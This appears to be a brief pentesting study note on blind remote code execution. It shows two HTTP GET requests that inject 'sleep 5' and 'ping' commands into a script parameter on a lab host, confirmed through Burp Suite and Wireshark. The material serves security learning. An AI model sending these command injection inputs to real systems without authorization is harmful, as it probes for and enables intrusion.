---
title: RCE attack - Remote Code Execution
author: amandaguglieri
draft: false
TableOfContents: true
tag: pentesting, web pentesting
--- 

Exploiting Blind Remote Execution Vulnerability attack in a GET request in BurpSuite (to run the queries) and Wireshark (to capture the traffic).

```
________
GET /script.php?c=sleep+5&ok=ok HTTP/1.1
Host 192.168.137.130
User Agent....
...
________
```


Also other command:

```
GET /script.php?c=ping+192.168.139.130+-c+5&ok=ok HTTP/1.1
```


